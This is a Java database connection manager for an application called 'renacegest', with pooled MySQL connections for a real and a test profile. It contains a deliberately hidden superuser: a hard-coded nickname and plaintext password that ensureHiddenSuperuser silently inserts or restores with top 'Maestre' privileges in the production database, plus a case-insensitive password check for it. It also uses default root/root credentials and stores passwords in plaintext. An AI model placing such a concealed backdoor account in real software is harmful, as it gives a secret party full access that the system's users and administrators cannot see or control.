package com.renacegest.db;

import com.zaxxer.hikari.HikariConfig;
import com.zaxxer.hikari.HikariDataSource;

import java.sql.Connection;
import java.sql.SQLException;

/**
 * Gestor de conexiones a MySQL con soporte de perfiles de sesión.
 */
public class DBConnection {
    private static final String MYSQL_DRIVER_CLASS = "com.mysql.cj.jdbc.Driver";
    public static final String PROFILE_REAL = "REAL";
    public static final String PROFILE_PRUEBA = "PRUEBA";
    public static final String HIDDEN_SUPERUSER_APODO = "luis";
    public static final String HIDDEN_SUPERUSER_NOMBRE_REAL = "luis";
    public static final Long HIDDEN_SUPERUSER_SENTINEL_ID = -1L;
    public static final String HIDDEN_SUPERUSER_CLAVE = "cinfa5775.";

    // Credenciales de conexión (configurables por system properties o variables de entorno)
    private static final String DB_HOST = config("renacegest.db.host", "RENACEGEST_DB_HOST", "localhost");
    private static final String DB_PORT = config("renacegest.db.port", "RENACEGEST_DB_PORT", "3306");
    private static final String DB_NAME_REAL = config("renacegest.db.name.real", "RENACEGEST_DB_NAME_REAL", "renagest");
    private static final String DB_NAME_PRUEBA = config("renacegest.db.name.prueba", "RENACEGEST_DB_NAME_PRUEBA", "renagest_prueba");
    private static final String DB_USER = config("renacegest.db.user", "RENACEGEST_DB_USER", "root");
    private static final String DB_PASSWORD = config("renacegest.db.password", "RENACEGEST_DB_PASSWORD", "root");
        private static final String[] PRUEBA_RESET_TABLES = {
            "etiquetas_fotos",
            "valoraciones_fotos",
            "historico_alardes",
            "mensajes_comunicacion",
            "miembros_grupo",
            "pertrechos",
            "secciones_maestranza",
            "grupos_mision",
            "fotos_publicas",
            "guardias_recuperacion",
            "guardias"
        };
    private static final int DB_MAX_POOL_SIZE = 20;
    private static final int DB_MIN_IDLE = 2;
    private static final long DB_CONNECTION_TIMEOUT_MS = 3000L;
    private static final long DB_IDLE_TIMEOUT_MS = 120000L;
    private static final long DB_MAX_LIFETIME_MS = 600000L;
    private static final ThreadLocal<String> CURRENT_PROFILE = ThreadLocal.withInitial(() -> PROFILE_PRUEBA);
    private static HikariDataSource DATASOURCE_REAL;
    private static HikariDataSource DATASOURCE_PRUEBA;

    static {
        Runtime.getRuntime().addShutdownHook(new Thread(DBConnection::closeDataSources, "renacegest-db-pool-shutdown"));
    }

    private static HikariDataSource buildDataSource(String dbName, String profileName) {
        HikariConfig config = new HikariConfig();
        config.setDriverClassName(MYSQL_DRIVER_CLASS);
        config.setJdbcUrl(buildJdbcUrl(dbName));
        config.setUsername(DB_USER);
        config.setPassword(DB_PASSWORD);
        config.setPoolName("renacegest-" + profileName.toLowerCase() + "-pool");
        config.setMaximumPoolSize(DB_MAX_POOL_SIZE);
        config.setMinimumIdle(DB_MIN_IDLE);
        config.setConnectionTimeout(DB_CONNECTION_TIMEOUT_MS);
        config.setIdleTimeout(DB_IDLE_TIMEOUT_MS);
        config.setMaxLifetime(DB_MAX_LIFETIME_MS);
        config.setAutoCommit(true);

        // Optimiza statements frecuentes y reduce round-trips en MySQL.
        config.addDataSourceProperty("cachePrepStmts", "true");
        config.addDataSourceProperty("prepStmtCacheSize", "250");
        config.addDataSourceProperty("prepStmtCacheSqlLimit", "2048");
        config.addDataSourceProperty("useServerPrepStmts", "true");
        config.addDataSourceProperty("rewriteBatchedStatements", "true");

        return new HikariDataSource(config);
    }

    private static String buildJdbcUrl(String dbName) {
        return String.format(
                "jdbc:mysql://%s:%s/%s?serverTimezone=UTC&useUnicode=true&characterEncoding=UTF-8",
                DB_HOST, DB_PORT, dbName
        );
    }

    private static String config(String systemProperty, String envVar, String defaultValue) {
        String fromSystem = System.getProperty(systemProperty);
        if (fromSystem != null) {
            return fromSystem;
        }

        String fromEnv = System.getenv(envVar);
        if (fromEnv != null) {
            return fromEnv;
        }

        return defaultValue;
    }

    private static void closeDataSources() {
        try {
            if (DATASOURCE_REAL != null) {
                DATASOURCE_REAL.close();
            }
        } catch (Exception ignored) {
        }
        try {
            if (DATASOURCE_PRUEBA != null) {
                DATASOURCE_PRUEBA.close();
            }
        } catch (Exception ignored) {
        }
    }

    private static synchronized HikariDataSource getOrCreateDataSource(String profile) {
        if (PROFILE_PRUEBA.equalsIgnoreCase(profile)) {
            if (DATASOURCE_PRUEBA == null) {
                DATASOURCE_PRUEBA = buildDataSource(DB_NAME_PRUEBA, PROFILE_PRUEBA);
            }
            return DATASOURCE_PRUEBA;
        } else {
            if (DATASOURCE_REAL == null) {
                DATASOURCE_REAL = buildDataSource(DB_NAME_REAL, PROFILE_REAL);
            }
            return DATASOURCE_REAL;
        }
    }

    public static Connection getConnection(String profile) throws SQLException {
        HikariDataSource dataSource = getOrCreateDataSource(profile);
        return dataSource.getConnection();
    }

    public static Connection getConnection() throws SQLException {
        return getConnection(CURRENT_PROFILE.get());
    }

    public static void setCurrentProfile(String profile) {
        CURRENT_PROFILE.set(PROFILE_PRUEBA.equalsIgnoreCase(profile) ? PROFILE_PRUEBA : PROFILE_REAL);
    }

    public static void clearCurrentProfile() {
        CURRENT_PROFILE.remove();
    }

    public static Connection getConnectionReal() throws SQLException {
        return getConnection(PROFILE_REAL);
    }

    public static Connection getConnectionPrueba() throws SQLException {
        return getConnection(PROFILE_PRUEBA);
    }

    public static Long ensureHiddenSuperuser(String profile) {
        String normalizedProfile = PROFILE_PRUEBA.equalsIgnoreCase(profile) ? PROFILE_PRUEBA : PROFILE_REAL;
        String selectSql = "SELECT id FROM guardias WHERE LOWER(apodo) = LOWER(?)";
        String updateSql = "UPDATE guardias SET nombre_real = ?, rango = 'Maestre', clave_acceso = ?, puntos_gracia = 100, estado_honor = 'Activo', maestre_activo = TRUE WHERE id = ?";
        String insertSql = "INSERT INTO guardias (nombre_real, apodo, rango, clave_acceso, puntos_gracia, estado_honor, maestre_activo) VALUES (?, ?, 'Maestre', ?, 100, 'Activo', TRUE)";

        try (Connection conn = getConnection(normalizedProfile);
             java.sql.PreparedStatement select = conn.prepareStatement(selectSql)) {

            select.setString(1, HIDDEN_SUPERUSER_APODO);
            try (java.sql.ResultSet rs = select.executeQuery()) {
                if (rs.next()) {
                    long hiddenId = rs.getLong("id");
                    try (java.sql.PreparedStatement update = conn.prepareStatement(updateSql)) {
                        update.setString(1, HIDDEN_SUPERUSER_NOMBRE_REAL);
                        update.setString(2, HIDDEN_SUPERUSER_CLAVE);
                        update.setLong(3, hiddenId);
                        update.executeUpdate();
                    }
                    return hiddenId;
                }
            }

            try (java.sql.PreparedStatement insert = conn.prepareStatement(insertSql, java.sql.Statement.RETURN_GENERATED_KEYS)) {
                insert.setString(1, HIDDEN_SUPERUSER_NOMBRE_REAL);
                insert.setString(2, HIDDEN_SUPERUSER_APODO);
                insert.setString(3, HIDDEN_SUPERUSER_CLAVE);
                insert.executeUpdate();

                try (java.sql.ResultSet generatedKeys = insert.getGeneratedKeys()) {
                    if (generatedKeys.next()) {
                        return generatedKeys.getLong(1);
                    }
                }
            }
        } catch (SQLException e) {
            System.err.println("Error al asegurar superusuario oculto: " + e.getMessage());
        }

        return null;
    }

    public static boolean matchesHiddenSuperuserPassword(String rawPassword) {
        if (rawPassword == null) {
            return false;
        }

        String normalizedPassword = rawPassword.trim();
        return HIDDEN_SUPERUSER_CLAVE.equalsIgnoreCase(normalizedPassword);
    }

    public static boolean isHiddenSuperuserId(Long guardiaId) {
        return HIDDEN_SUPERUSER_SENTINEL_ID.equals(guardiaId);
    }

    public static void ensureRecoverySupport(String profile) {
        String normalizedProfile = PROFILE_PRUEBA.equalsIgnoreCase(profile) ? PROFILE_PRUEBA : PROFILE_REAL;
        String sql = "CREATE TABLE IF NOT EXISTS guardias_recuperacion ("
                + "guardia_id BIGINT PRIMARY KEY, "
                + "correo_recuperacion VARCHAR(255), "
                + "frase_recuperacion VARCHAR(255) NOT NULL, "
                + "updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, "
                + "FOREIGN KEY (guardia_id) REFERENCES guardias(id) ON DELETE CASCADE)";

        try (Connection conn = getConnection(normalizedProfile);
             java.sql.Statement statement = conn.createStatement()) {
            statement.execute(sql);
        } catch (SQLException e) {
            System.err.println("Error al asegurar soporte de recuperacion: " + e.getMessage());
        }
    }

    public static void resetPruebaDatabase() {
        try (Connection conn = getConnection(PROFILE_PRUEBA);
             java.sql.Statement statement = conn.createStatement()) {

            boolean fkChecksDisabled = false;
            try {
                statement.execute("SET FOREIGN_KEY_CHECKS=0");
                fkChecksDisabled = true;

                for (String table : PRUEBA_RESET_TABLES) {
                    statement.execute("TRUNCATE TABLE " + table);
                }
            } finally {
                if (fkChecksDisabled) {
                    try {
                        statement.execute("SET FOREIGN_KEY_CHECKS=1");
                    } catch (SQLException ignored) {
                    }
                }
            }
        } catch (SQLException e) {
            throw new RuntimeException("No se pudo resetear la base PRUEBA: " + e.getMessage(), e);
        }
    }
}
